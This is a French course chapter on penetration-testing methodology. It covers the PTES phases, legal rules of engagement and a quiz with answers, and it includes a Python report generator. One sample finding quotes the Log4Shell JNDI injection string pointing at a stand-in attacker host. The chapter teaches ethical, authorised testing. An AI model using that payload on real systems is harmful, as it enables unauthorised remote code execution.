# TOME P11 — DevSecOps, Cloud Security & Gouvernance — Jour 533 (6h) : Méthodologie de Penetration Testing : Norme PTES, OWASP Web Testing Guide, Kali Linux & Reporting Éthique

> [!NOTE]
> **Objectifs pédagogiques :**
> - Maîtriser le cadre méthodologique standard d'un test d'intrusion : **PTES (Penetration Testing Execution Standard)**
> - Appliquer le guide d'évaluation de sécurité applicative **OWASP Web Security Testing Guide (WSTG v4.2)**
> - Manipuler les distributions spécialisées (**Kali Linux**) et les outils de reconnaissance, de scan et d'exploitation éthique (Nmap, Burp Suite, Metasploit)
> - Structurer et rédiger un rapport d'audit d'intrusion professionnel (Executive Summary & Technical Remediation)
>
> **Compétences visées :** `SEC-04` (A), `SEC-05` (A) — Ethical Hacking & Penetration Testing

---

## Module 1 — Méthodologie PTES & Phases d'un Pentest (2h)

### 📖 Intuition & Narration

Le test d'intrusion éthique (Pentesting) n'est pas une activité d'improvisation anarchique. Sans cadre formel, un pentesteur risque soit de rater des vulnérabilités majeures, soit de provoquer une interruption de service (Crash / DSI) non sollicitée en production.

La norme **PTES (Penetration Testing Execution Standard)** définit les 7 phases obligatoires d'une mission de test d'intrusion professionnelle :

1. **Pre-engagement Interactions** : Définition du périmètre (Scope), des règles d'engagement (RoE) et signature de l'autorisation écrite.
2. **Intelligence Gathering** : Reconnaissance passive (OSINT) et active.
3. **Threat Modeling** : Cartographie des cibles et identification des vecteurs d'attaque.
4. **Vulnerability Analysis** : Détection des vulnérabilités (Scans & analyse manuelle).
5. **Exploitation** : Franchissement contrôlé de la première ligne de défense.
6. **Post-Exploitation** : Maintien d'accès, élévation de privilèges et mouvement latéral.
7. **Reporting** : Rdaction du rapport synthétique et technique.

### 🔍 Anatomie Technique — Les 7 Phases du Standard PTES

```
LES 7 PHASES DE LA NORME PTES (PENETRATION TESTING EXECUTION STANDARD)

  ┌────────────────────────────────────────────────────────────────────────┐
  │ 1. PRE-ENGAGEMENT ──► Scope, Lettre d'autorisation signée (Mandat)     │
  ├────────────────────────────────────────────────────────────────────────┤
  │ 2. INTELLIGENCE GATHERING ──► OSINT (Shodan, Amass, Nmap, DNS enumeration)│
  ├────────────────────────────────────────────────────────────────────────┤
  │ 3. THREAT MODELING ──► Analyse des vecteurs d'attaque privilégiés       │
  ├────────────────────────────────────────────────────────────────────────┤
  │ 4. VULNERABILITY ANALYSIS ──► Scans de vulnérabilités (Nessus, Nuclei) │
  ├────────────────────────────────────────────────────────────────────────┤
  │ 5. EXPLOITATION ──► Proof of Concept (PoC) contrôlé (Metasploit, Burp) │
  ├────────────────────────────────────────────────────────────────────────┤
  │ 6. POST-EXPLOITATION ──► Détermination de l'impact business réel      │
  ├────────────────────────────────────────────────────────────────────────┤
  │ 7. REPORTING ──► Synthèse Exécutive + Recommandations de Remédiation  │
  └────────────────────────────────────────────────────────────────────────┘
```

---

## Module 2 — Atelier Pratique : Automated Nmap Parser & Pentest Report Engine (2h)

### 🛠️ Code Python : Pentest Findings Aggregator & Report Engine

```python
#!/usr/bin/env python3
"""
PARADIS — Ethical Pentest Report & Finding Aggregator Engine
Agrège et formate les découvertes de vulnérabilités d'un test d'intrusion selon les standards PTES / OWASP.
"""

import json
import sys
from dataclasses import dataclass
from datetime import datetime
from typing import List

@dataclass
class PentestFinding:
    id: str
    title: str
    category: str      # "Injection", "Broken Auth", "Misconfiguration"
    severity: str      # "CRITICAL", "HIGH", "MEDIUM", "LOW"
    cvss_score: float
    affected_asset: str
    poc_description: str
    remediation_recommendation: str

class PentestReportGenerator:
    def __init__(self, client_name: str, target_scope: str):
        self.client_name = client_name
        self.target_scope = target_scope
        self.findings: List[PentestFinding] = []

    def add_finding(self, finding: PentestFinding):
        self.findings.append(finding)

    def generate_executive_summary(self) -> dict:
        print("=== GENERATION DU RAPPORT D'AUDIT D'INTRUSION ÉTHIQUE PARADIS IT ===")
        total_findings = len(self.findings)
        critical_count = sum(1 for f in self.findings if f.severity == "CRITICAL")
        high_count     = sum(1 for f in self.findings if f.severity == "HIGH")

        overall_risk = "CRITICAL" if critical_count > 0 else ("HIGH" if high_count > 0 else "MEDIUM")

        return {
            "client": self.client_name,
            "scope": self.target_scope,
            "audit_date": datetime.now().strftime("%Y-%m-%d"),
            "overall_risk_level": overall_risk,
            "metrics": {
                "total_vulnerabilities": total_findings,
                "critical": critical_count,
                "high": high_count,
                "medium": sum(1 for f in self.findings if f.severity == "MEDIUM"),
                "low": sum(1 for f in self.findings if f.severity == "LOW")
            },
            "findings_detail": [
                {
                    "id": f.id,
                    "title": f.title,
                    "severity": f.severity,
                    "asset": f.affected_asset,
                    "remediation": f.remediation_recommendation
                } for f in self.findings
            ]
        }

if __name__ == "__main__":
    report_gen = PentestReportGenerator("PARADIS Finance", "https://api.paradis-finance.fr (195.154.10.0/24)")

    report_gen.add_finding(PentestFinding(
        id="VULN-001",
        title="Unauthenticated Remote Code Execution in Log4j",
        category="Injection",
        severity="CRITICAL",
        cvss_score=10.0,
        affected_asset="https://api.paradis-finance.fr/auth",
        poc_description="Injection de la chaîne `${jndi:ldap://attacker.com/a}` dans le header User-Agent.",
        remediation_recommendation="Mettre à jour Log4j vers la version 2.17.1 ou supérieure immédiatement."
    ))

    report_gen.add_finding(PentestFinding(
        id="VULN-002",
        title="Missing HTTP Strict Transport Security (HSTS) Header",
        category="Misconfiguration",
        severity="LOW",
        cvss_score=3.1,
        affected_asset="https://api.paradis-finance.fr",
        poc_description="L'en-tête Strict-Transport-Security est absent des réponses HTTP.",
        remediation_recommendation="Ajouter l'en-tête 'Strict-Transport-Security: max-age=31536000; includeSubDomains'."
    ))

    report = report_gen.generate_executive_summary()

    print("\n" + "═"*75)
    print("  RAPPORT SYNTHÉTIQUE DE TEST D'INTRUSION (EXECUTIVE SUMMARY)")
    print("═"*75)
    print(json.dumps(report, indent=2))
    print("═"*75)
```

---

## Module 3 — Règles d'Engagement & Déontologie de l'Ethical Hacking (1h30)

### 🔍 Règles d'Engagement (RoE) & Aspects Légaux

Un test d'intrusion réalisé **sans ordre de mission (mandat)** formellement signé par le propriétaire légal des systèmes est un délit pénal (Accès frauduleux à un système de traitement automatisé de données - Art. 323-1 du Code Pénal).

La convention de pentest doit impérativement définir :
- **Périmètre exact (Scope)** : Adresses IP, Noms de domaine autorisés (et cibles explicitement exclues).
- **Fenêtre d'attaque** : Plages horaires autorisées (ex: week-end ou nuit).
- **Contacts d'urgence** : Nombres de téléphone 24/7 du SOC et du CISO en cas de problème.

---

## Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **PTES** | Penetration Testing Execution Standard — Norme de réalisation des tests d'intrusion |
| **OSINT** | Open Source Intelligence — Renseignement d'origine source ouverte |
| **WSTG** | Web Security Testing Guide — Guide d'évaluation de sécurité Web de l'OWASP |
| **PoC** | Proof of Concept — Démonstration de preuve de la faisabilité d'une attaque |

---

## Exercices Pratiques

### Exercice 1 — Identification de la Phase PTES

Lors d'une mission de test d'intrusion, le pentesteur découvre une sous-domaine oublié (`dev.paradis.fr`) grâce à l'outil `subfinder` et `Shodan`. De quelle phase de la norme **PTES** s'agit-il ?

**Corrigé guidé :**
Il s'agit de la Phase 2 : **Intelligence Gathering (Reconnaissance / OSINT)**.

---

## Banque QCM — 5 Questions

**Q1.** Quelle est la toute première phase obligatoire de la norme **PTES (Penetration Testing Execution Standard)** avant de lancer le moindre scan ?

- A) L'exploitation des vulnérabilités.
- B) Pre-engagement Interactions (Définition du périmètre, règles d'engagement et signature de la lettre d'autorisation). ✅
- C) L'extinction des serveurs.
- D) La rédaction du rapport final.

**Q2.** Que se passe-t-il si un ingénieur sécurité effectue un test d'intrusion sur une adresse IP sans autorisation écrite préalable du propriétaire ?

- A) Il reçoit une prime.
- B) C'est un délit pénal puni par la loi (Accès et maintien frauduleux dans un STAD). ✅
- C) Rien, c'est légal si c'est pour tester.
- D) Google lui offre une médaille.

**Q3.** Quel outil d'interception et d'analyse de requêtes HTTP/HTTPS est le standard absolu pour les audits de sécurité applicative Web ?

- A) Burp Suite. ✅
- B) Microsoft Word.
- C) VLC Media Player.
- D) Excel.

**Q4.** Qu'est-ce qu'un **Proof of Concept (PoC)** dans un rapport de pentest ?

- A) Une facture de restaurant.
- B) La démonstration technique contrôlée et reproductible prouvant l'existence réelle de la vulnérabilité sans causer de dégâts en production. ✅
- C) Un diplôme d'école.
- D) Une photo de l'équipe.

**Q5.** Dans un rapport d'audit d'intrusion professionnel, à qui est destinée la section **Executive Summary** ?

- A) Aux robots d'indexation Google.
- B) Aux membres de la direction générale et du Conseil d'Administration, en présentant une synthèse non technique des risques financiers et stratégiques. ✅
- C) Uniquement aux administrateurs système Linux.
- D) Aux stagiaires.

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
